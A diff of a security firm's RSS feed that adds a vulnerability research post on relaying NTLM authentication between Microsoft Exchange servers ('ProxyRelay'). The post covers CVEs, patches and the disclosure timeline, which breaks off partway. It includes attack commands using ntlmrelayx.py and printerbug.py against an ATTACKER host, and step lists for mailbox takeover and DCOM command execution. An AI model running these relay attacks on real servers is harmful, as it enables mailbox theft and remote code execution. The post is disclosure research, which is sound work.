@@ -4,11 +4,209 @@
         <title>DEVCORE 戴夫寇爾</title>
         <description>DEVCORE 戴夫寇爾 - 滲透測試服務、資安教育訓練、資安顧問服務</description>
         <link>https://devco.re</link>
-        <lastBuildDate>Wed, 21 Sep 2022 19:16:00 +0800</lastBuildDate>
-        <pubDate>Wed, 21 Sep 2022 19:16:00 +0800</pubDate>
+        <lastBuildDate>Wed, 19 Oct 2022 20:17:35 +0800</lastBuildDate>
+        <pubDate>Wed, 19 Oct 2022 20:17:35 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />
 
+
+        <item>
+                <title>A New Attack Surface on MS Exchange Part 4 - ProxyRelay!</title>
+                <description>&lt;p&gt;Hi, this is a long-time-pending article. We could have published this article earlier (the original bug was reported to MSRC in June 2021 with a 90-days Public Disclosure Policy). However, during communications with MSRC, they explained that since this is an architectural design issue, lots of code changes and testings are expected and required, so they hope to resolve this problem with a one-time CU (Cumulative Update) instead of the regular Patch Tuesday. We understand their situation and agree to extend the deadline.&lt;/p&gt;
+
+&lt;p&gt;Microsoft eventually released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt; on April 20, 2022. However, &lt;strong&gt;this patch did not enable by default&lt;/strong&gt;. Microsoft didn’t release the patch-activating methods until August 09, 2022. So, we originally had the opportunity to demonstrate our attack at &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2022/1/12/pwn2own-vancouver-2022-luanch&quot;&gt;Pwn2Own Vancouver 2021&lt;/a&gt;. However, we dropped the idea quickly because our intention is not to earn bounties. We are here to &lt;a href=&quot;https://devco.re/en/about/&quot;&gt;secure the world&lt;/a&gt;! You can check the &lt;a href=&quot;#Timeline&quot;&gt;Timeline&lt;/a&gt; to know the detailed disclosure process.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;idea&quot;&gt;Idea&lt;/h1&gt;
+
+&lt;p&gt;Since Microsoft blocked our Proxy-Related attacks in April 2021, I have been thinking about whether there is a way to bypass the mitigation. During that April patch, Microsoft enhanced the authentication part of CAS Frontend by requiring all HTTP requests that need a Kerberos Ticket to be authenticated first. This enhancement effectively mitigated the attack surface we proposed and stopped unauthenticated HTTP requests accessing the CAS Backend. So Exchange is safe now?&lt;/p&gt;
+
+&lt;p&gt;Of course not, and this article is to prove this! Since Microsoft only fixes the problematic code, we proposed several attacks and possible weaknesses in our &lt;a href=&quot;https://powerofcommunity.net/2021.htm&quot;&gt;POC 2021&lt;/a&gt; and &lt;a href=&quot;https://hitcon.org/2021/agenda/279d7810-e619-4dc3-9113-b11bad5277ec/&quot;&gt;HITCON 2021&lt;/a&gt; talks.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20221019/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Maybe you have heard that our first prediction has already been made in recent &lt;a href=&quot;https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9&quot;&gt;ProxyNotShell&lt;/a&gt;. The attack reuses the path confusion of ProxyShell but attaches a pre-known authentication instead. It’s solid but it looks it still needs a valid authentication (not sure, still haven’t time to dig into). However, we hinted there is another way not to fight with the auth-enhancement face-to-face during my talks. Now we can finally disclose it :)&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Just in case you don’t know, I am a big fan of &lt;a href=&quot;https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn&quot;&gt;Printer Bug&lt;/a&gt; (kudos to &lt;a href=&quot;https://twitter.com/tifkin_&quot;&gt;Lee Christensen&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Will Schroeder&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/enigma0x3&quot;&gt;Matt Nelson&lt;/a&gt; for their amazing talk at &lt;a href=&quot;https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory&quot;&gt;DerbyCon 2018&lt;/a&gt;). PrinterBug allows an attacker to coerce any domain-joined machine to initiate an SMB connection with its own Machine Account to the attacker via &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1&quot;&gt;MS-RPRN&lt;/a&gt; protocol. Because this behavior works as designed, this hacker-friendly feature has been extensively used for NTLM relaying for years.&lt;/p&gt;
+
+&lt;p&gt;In the architecture of Exchange CAS, Backend authorizes an HTTP request to have the ability to impersonate any user by checking whether the login identity has the Extended Right of &lt;code class=&quot;highlighter-rouge&quot;&gt;ms-Exch-EPI-Token-Serialization&lt;/code&gt; or not. Also, during the Exchange Server installation, the mailbox server will be added to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Exchange Servers group&lt;/code&gt; automatically, and all objects in this Active Directory group have that Token-Serialization right by default.&lt;/p&gt;
+
+&lt;p&gt;With the prior knowledge in mind, I come up with a simple idea. It’s common to see multiple Exchange Servers in corporate networks for high availability and site resilience. &lt;strong&gt;Can we relay the NTLM authentication among Exchange Servers?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;There are several pros to this relay idea. Since it’s a cross-machine relay, it won’t be limited by the same-host restriction. Also, because the NTLM authentication is initiated by the Machine Account of Exchange Server, the relayed authentication owns the Token-Serialization right that allows us to impersonate any user in Exchange services. I believe this is a fantastic idea and would like to explore if it is exploitable!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;P.S. This attack surface was also found and reported to MSRC independently by &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt; from Tencent Xuanwu Lab, so you can see we share most of the CVE acknowledgments.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;
+
+&lt;p&gt;Let’s talk about the vulnerabilities. Since it’s an entire attack surface instead of a single bug, this idea could be applied to different contexts, causing different vulnerabilities. The impact of these vulnerabilities is that an attacker can bypass Exchange authentications or even get code execution without user-interaction. Here are the related CVEs so far:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; - Relay to Exchange FrontEnd&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; - Relay to Exchange BackEnd&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; - Relay to Exchange DCOM&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-RESERVED&quot;&gt;CVE-2022-RESERVED&lt;/a&gt; - Relay to other services of Exchange&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The following attacks have the similar template, the host &lt;code class=&quot;highlighter-rouge&quot;&gt;EX01&lt;/code&gt; stands for the first Exchange Server, &lt;code class=&quot;highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for the second Exchange Server, and &lt;code class=&quot;highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; for the attacker-controlled server.&lt;/p&gt;
+
+&lt;p&gt;In all attacks, the attacker coerces the first Exchange Server to initiate an NTLM authentication to him, and relay it to the second Exchange Server. We use &lt;a href=&quot;https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py&quot;&gt;printerbug.py&lt;/a&gt; to coerce a server to initiate an SMB connection and use &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py&quot;&gt;ntlmrelayx.py&lt;/a&gt; to catch the NTLM and relay the authentication to another Exchange Server.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;round-1---relay-to-exchange-frontend&quot;&gt;Round 1 - Relay to Exchange FrontEnd&lt;/h2&gt;
+
+&lt;p&gt;For the first context, we try to relay the authentication to another Frontend of Exchange Server. Since the identity of the relayed authentication is Exchange’s Machine Account which owns the Token-Serialization right, we can impersonate any user! Here we relay the NTLM authentication from &lt;code class=&quot;highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;EX02&lt;/code&gt;’s Frontend EWS service as the showcase. We implement the relay-to-frontend-EWS attack by customizing the &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py&quot;&gt;httpattack.py&lt;/a&gt;! Here is a simple overview:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Run the &lt;code class=&quot;highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; on the &lt;code class=&quot;highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; server to wait for NTLM authentications.&lt;/li&gt;
+  &lt;li&gt;Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;printerbug.py&lt;/code&gt; to coerce &lt;code class=&quot;highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate an SMB connection to &lt;code class=&quot;highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Receive the SMB connection on the &lt;code class=&quot;highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; and relay the NTLM blobs to &lt;code class=&quot;highlighter-rouge&quot;&gt;EX02&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Complete the NTLM handshakes to get full access to the EWS endpoint.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Terminal 1&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python ntlmrelayx.py &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; https://EX02/EWS/Exchange.asmx
+
+&lt;span class=&quot;c&quot;&gt;# Terminal 2&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python printerbug.py EX01 ATTACKER
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Theoretically, we can take over the target mailbox by &lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange&quot;&gt;EWS operations&lt;/a&gt;. Here we give a demo to dump the secret under administrator’s mailbox.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/IFRvmo6AZoY&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h3 id=&quot;patching-frontend&quot;&gt;Patching FrontEnd&lt;/h3&gt;
+
+&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; and released a patch to fix that Frontend is relay-able in July 2021. Since logging in as Machine Account in Frontend isn’t a regular operation, it’s easy to mitigate the attack by adding a check &lt;code class=&quot;highlighter-rouge&quot;&gt;IsSystemOrMachineAccount()&lt;/code&gt; on the Frontend Proxy-Handler to ensure all Frontend logons are not Machine Account.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;round-2---relay-to-exchange-backend&quot;&gt;Round 2 - Relay to Exchange BackEnd&lt;/h2&gt;
+
+&lt;p&gt;Relaying to Frontend can be easily mitigated by a simple check. How about relaying to Backend? Since Backend verifies the Frontend requests by checking whether it’s a Machine Account or not, mitigating Backend would be more challenging because it’s a regular operation and Backend needs the Machine Account that hash the extended right of ms-Exch-EPI-Token-Serialization to impersonate to the desired user. Here we provide 3 showcases against attacking Backend.&lt;/p&gt;
+
+&lt;h3 id=&quot;2-1-attacking-backend-ews&quot;&gt;2-1 Attacking BackEnd &lt;code class=&quot;highlighter-rouge&quot;&gt;/EWS&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;Based on the relay-to-frontend EWS attack we introduced, the earlier attack can be re-applied to Backend seamlessly. The only change is to modify the target port from 443 to 444.&lt;/p&gt;
+
+&lt;h3 id=&quot;2-2-attacking-backend-rpc&quot;&gt;2-2 Attacking BackEnd &lt;code class=&quot;highlighter-rouge&quot;&gt;/RPC&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;The other showcase is attacking &lt;a href=&quot;https://learn.microsoft.com/en-us/exchange/outlook-anywhere-exchange-2013-help&quot;&gt;Outlook Anywhere&lt;/a&gt;. Exchange defines several internal RPC services that can directly operate the mailbox. Those RPC services have a public interface and can be access through &lt;code class=&quot;highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt;, and users can access their own mailbox via RPC-over-HTTP protocol, which is described in Microsoft’s &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpch/c0f4c9c5-1a61-4d10-b8e2-005378d1d212&quot;&gt;MS-RPCH&lt;/a&gt; specification. For those who want to understand the underlying mechanism, it’s recommended to read the awesome research &lt;a href=&quot;https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/&quot;&gt;Attacking MS Exchange Web Interfaces&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_mohemiv&quot;&gt;Arseniy Sharoglazov&lt;/a&gt; for details.&lt;/p&gt;
+
+&lt;p&gt;Back to our attack, the core logic is as same as attacking EWS. Because the &lt;code class=&quot;highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt; is also located at HTTP/HTTPS, it’s also relay-able. Once we bypass the authentication and access the route &lt;code class=&quot;highlighter-rouge&quot;&gt;/Rpc/RpcProxy.dll&lt;/code&gt;, we can impersonate as any user and operate his mailbox through the RPC-over-HTTP protocol. To implement the attack, we have ported lots of the &lt;a href=&quot;https://github.com/sensepost/ruler&quot;&gt;Ruler Project&lt;/a&gt; to &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt;. As the result of this showcase, we can bypass the authentication by PrinterBug and operates any user’s mailbox through Outlook Anywhere. The entire attack can be illustrated as the following steps:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Establish &lt;code class=&quot;highlighter-rouge&quot;&gt;RCP_IN_DATA&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;RCP_OUT_DATA&lt;/code&gt;  channels to &lt;code class=&quot;highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for RPC I/O.&lt;/li&gt;
+  &lt;li&gt;Trigger PrinterBug on &lt;code class=&quot;highlighter-rouge&quot;&gt;EX01&lt;/code&gt; and relay to &lt;code class=&quot;highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to complete NTLM handshakes.&lt;/li&gt;
+  &lt;li&gt;Attach &lt;code class=&quot;highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; headers to indicate we are Exchange Admin on both HTTP headers.&lt;/li&gt;
+  &lt;li&gt;Interact with the Outlook Anywhere by lots of the coding works upon &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a&quot;&gt;MS-OXCRPC&lt;/a&gt; and &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef&quot;&gt;MS-OXCROPS&lt;/a&gt; over MS-RPCH…&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;2-3-attacking-backend-powershell&quot;&gt;2-3 Attacking BackEnd &lt;code class=&quot;highlighter-rouge&quot;&gt;/PowerShell&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;The last showcase we would like to highlight is relaying to Exchange PowerShell. Since we have bypassed the authentication on Backend IIS, it’s possible to perform a &lt;a href=&quot;https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html&quot;&gt;ProxyShell-Like&lt;/a&gt; exploit again! Once we can execute arbitrary Exchange Cmdlets, it shouldn’t be hard to find a Post-Auth RCE to chain together because we are Exchange Admin. There are hundreds of Cmdlets for the purpose of Exchange Management, and many past cases (&lt;a href=&quot;https://srcincite.io/advisories/src-2020-0019/&quot;&gt;CVE-2020-16875&lt;/a&gt;, &lt;a href=&quot;https://srcincite.io/advisories/src-2020-0025/&quot;&gt;CVE-2020-17083&lt;/a&gt;, &lt;a href=&quot;https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/&quot;&gt;CVE-2020-17132&lt;/a&gt;, &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&quot;&gt;CVE-2021-31207&lt;/a&gt; and more) have proven that this is not a difficult task, too.&lt;/p&gt;
+
+&lt;p&gt;Since we decided not to participate in Pwn2Own, we did not implement this exploit chain. Here we leave this as an exercise for our readers. ;)&lt;/p&gt;
+
+&lt;h3 id=&quot;2-4-patching-backend&quot;&gt;2-4 Patching BackEnd&lt;/h3&gt;
+
+&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; and patch that in August 2022. This patch permanently eliminates all relay attacks on Backend by forcibly turning on the &lt;a href=&quot;https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/&quot;&gt;Extended Protection Authentication&lt;/a&gt; in IIS.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;round-3---relay-to-windows-dcom&quot;&gt;Round 3 - Relay to Windows DCOM&lt;/h2&gt;
+
+&lt;p&gt;This part should be all credited to &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt;. The industry knows MS-DCOM is relay-able since &lt;a href=&quot;https://twitter.com/sploutchy&quot;&gt;Sylvain Heiniger&lt;/a&gt;’s awesome &lt;a href=&quot;https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/&quot;&gt;Relaying NTLM authentication over RPC&lt;/a&gt; research for long. However, Dlive creates an RCE-chain based on the group inheritance of Exchange Servers in Active Directory environments. Please shout out to him!&lt;/p&gt;
+
+&lt;p&gt;The idea of this attack is that the &lt;code class=&quot;highlighter-rouge&quot;&gt;Local Administrators&lt;/code&gt; group of Exchange Server includes the group member &lt;code class=&quot;highlighter-rouge&quot;&gt;Exchange Trusted Subsystem&lt;/code&gt;, and all Exchange Server are in this group by default. That means the Machine Account &lt;code class=&quot;highlighter-rouge&quot;&gt;EX01$&lt;/code&gt; is also the local administrator of &lt;code class=&quot;highlighter-rouge&quot;&gt;EX02&lt;/code&gt;. With this concept in mind, the impact of relay-to-MS-DCOM can be maximized and perfectly applied to Exchange Server now!&lt;/p&gt;
+
+&lt;p&gt;Dlive has demonstrated this attack in his &lt;a href=&quot;https://www.youtube.com/watch?v=7h38rI8KT30&quot;&gt;DEFCON 29 talk&lt;/a&gt;. Although he didn’t publish the exploit code, the Wireshark screenshot in his &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf?page=45&quot;&gt;slides&lt;/a&gt;&lt;sup&gt;p45&lt;/sup&gt; has already hinted everything and is enough to reproduce. The process could be illustrated as the following:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Coerce &lt;code class=&quot;highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate a connection, and relay the NTLM to the Endpoint Mapper (port 135) of &lt;code class=&quot;highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to get the Interface of &lt;code class=&quot;highlighter-rouge&quot;&gt;MMC20.Application&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Coerce &lt;code class=&quot;highlighter-rouge&quot;&gt;EX01&lt;/code&gt; again, and relay the NTLM to the dynamic port allocated by the EPMapper, and call &lt;code class=&quot;highlighter-rouge&quot;&gt;ExecuteShellCommand(...)&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;iMMC-&amp;gt;Document-&amp;gt;ActiveView&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Run arbitrary commands for fun and profit!&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Writing the whole exploit is fun, just like mixing the &lt;code class=&quot;highlighter-rouge&quot;&gt;dcomexec.py&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; together. It’s recommended to write your own exploit code by hand for those who want to understand the DCOM mechanism more!&lt;/p&gt;
+
+&lt;h3 id=&quot;patching-dcom&quot;&gt;Patching DCOM&lt;/h3&gt;
+
+&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; and patch this DCOM-relay in June 2021. However, due to compatibility, &lt;strong&gt;the hardening on the server-side is disabled by default&lt;/strong&gt;. Server Admin has to manually activate the patch by creating the following registry key. If Server Admin didn’t read the documentation carefully, his Exchange Server is probably still vulnerable after the June patch.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\RequireIntegrityActivationAuthenticationLevel&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;As for when will the protection be enforced on server side? According to the FAQ under the CVE page, Microsoft has addressed a three-phase rollout to fully mitigate this issue. Now, it’s on phase one, and the patch won’t be activated by default until June 14, 2022. So, at the time of this writing, this RCE is still exploitable on the latest version of Exchange Server!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;P.S. Microsoft hash announce the second phase and enabled the hardening on the server-side by default on June 14, 2022. Exchange Server that installed the latest Windows patch should be safe now&lt;/em&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;round-4---relay-to-other-exchange-services&quot;&gt;Round 4 - Relay to Other Exchange Services…&lt;/h2&gt;
+
+&lt;p&gt;Services that use NTLM as their authentication method on Exchange Server might be vulnerable, too. At the time of this writing, we have already found and reported one to MSRC. We believe there should be more, and this is a good target for those who want to discover vulnerabilities on Exchange Server!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;closing&quot;&gt;Closing&lt;/h1&gt;
+
+&lt;p&gt;Here, this series has finally come to an end. Over the past two years, many ups and downs made this journey unusual. From the earliest bug collision with the bad actor, ITW panic, to the Pwn2Own hacking competition, and our talks got acceptance at top-level hacker conferences, we have a clear conscience that we didn’t do anything wrong. However, without understanding the context, there were lots of incorrect speculations and inaccurate media reports toward our company and me; there were even low blows to us… that sucks.&lt;/p&gt;
+
+&lt;p&gt;Although there were also happy moments, such as winning our first Master-of-Pwn champion at the top-hacking competition Pwn2Own and got the Best Server-Side bug of Pwnie Awards, the gossip and troll really harassed and depressed me a lot…&lt;/p&gt;
+
+&lt;p&gt;Congratulate that I can finally close this research and start my new hacking. I am nothing but a security nerd who would rather spend more time on hacks, and please don’t blame me if my sentences are sometimes short and unclear; it’s not easy to express things in an unfamiliar language. It took me about 4x~5x times to arrange a presentation or article in a non-native language; lots of words were lost during refining.&lt;/p&gt;
+
+&lt;p&gt;Hope that one day, there will be no language barrier. In a bar, with beers, we can talk about hacks, the culture, and hacking all night!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Jun 02, 2021&lt;/strong&gt; - We reported the vulnerability to Microsoft through the MSRC portal.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - MSRC opened the case. (No. 65594)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - We attached a 90-days Vulnerability Disclosure Policy to MSRC. The deadline is &lt;strong&gt;Sep 01, 2021&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Jun 11, 2021&lt;/strong&gt; - MSRC replied that they are aiming to complete it before September.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Jul 22, 2021&lt;/strong&gt; - MSRC said the case doesn’t look like it will be fully resolved by September.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Jul 25, 2021&lt;/strong&gt; - We said we could extend the deadline and let us know the new estimated date.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Aug 25, 2021&lt;/strong&gt; - We asked for the estimated date again.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Sep 01, 2021&lt;/strong&gt; - MSRC said this case has been expanding into a design change and the intended release date is &lt;strong&gt;December 2021&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Sep 08, 2021&lt;/strong&gt; - We asked is it possible to shorten the time frame because we would like to disclose this at conferences.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Sep 17, 2021&lt;/strong&gt; - MSRC replied there are not quick and simple fixes but design level changes, they can’t get the changes in October.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Oct 25, 2021&lt;/strong&gt; - We decided not to disclose this at conferences and gave the team a fair time for fixing and testing. We hoped this bug could be fixed as scheduled in December 2021.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Dec 21, 2021&lt;/strong&gt; - We asked for updates on this case.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Dec 22, 2021&lt;/strong&gt; - MSRC replied they aimed to include this patch in a CU (Cumulative Update) instead of an SU (Security Update) due to the level of changes. The next CU release date will be in &lt;strong&gt;March 2022&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Apr 04, 2022&lt;/strong&gt; - We asked that we don’t see the CU in March. When is the new release date?&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Apr 13, 2022&lt;/strong&gt; - MSRC replied the CU is delayed, and the current release date is on &lt;strong&gt;April 20, 2022&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Apr 20, 2022&lt;/strong&gt; - Microsoft released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Apr 21, 2022&lt;/strong&gt; - We found our exploit still works fine on the latest version of Exchange Server and asked is this bug really fixed?&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Apr 27, 2022&lt;/strong&gt; - MSRC replied the CU contain the code change, but it needs to be activated manually or with a script. There are still some testing concerns but the manual activation process will be public on &lt;strong&gt;May 10, 2022&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;May 11, 2022&lt;/strong&gt; - MSRC said the documentation and the script are mapped for the Patching Tuesday of June 2022 (&lt;strong&gt;Jun 14, 2022&lt;/strong&gt;).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Jun 10, 2022&lt;/strong&gt; - MSRC said there are still having some issues on testing and they are looking to release this in &lt;strong&gt;July 2022&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Jul 04, 2022&lt;/strong&gt; - We asked if it will release in this month’s Patching Tuesday.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Aug 10, 2022&lt;/strong&gt; - Don’t see anything, asked again.&lt;/li&gt;
